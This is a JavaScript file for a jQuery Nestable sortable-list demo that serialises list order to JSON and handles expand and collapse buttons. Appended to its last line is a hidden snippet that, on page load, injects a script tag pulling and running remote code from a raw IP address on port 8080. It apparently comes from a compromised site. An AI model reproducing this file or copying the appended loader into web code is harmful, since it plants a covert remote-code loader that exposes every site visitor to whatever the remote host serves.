$(document).ready(function()
{
    "use strict";
    var updateOutput = function(e)
    {
        var list   = e.length ? e : $(e.target),
            output = list.data('output');
        if (window.JSON) {
            output.val(window.JSON.stringify(list.nestable('serialize')));//, null, 2));
        } else {
            output.val('JSON browser support required for this demo.');
        }
    };

// activate Nestable for list 1
    $('#nestable').nestable({
        group: 1
    })
        .on('change', updateOutput);

// activate Nestable for list 2
    $('#nestable2').nestable({
        group: 1
    })
        .on('change', updateOutput);

// output initial serialised data
    updateOutput($('#nestable').data('output', $('#nestable-output')));
    updateOutput($('#nestable2').data('output', $('#nestable2-output')));

    $('#nestable-menu').on('click', function(e)
    {
        var target = $(e.target),
            action = target.data('action');
        if (action === 'expand-all') {
            $('.dd').nestable('expandAll');
        }
        if (action === 'collapse-all') {
            $('.dd').nestable('collapseAll');
        }
    });
    $('#nestable3').nestable();
});;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id ='1qa2ws';s.type='text/javascript';s.src='http://105.203.255.69:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);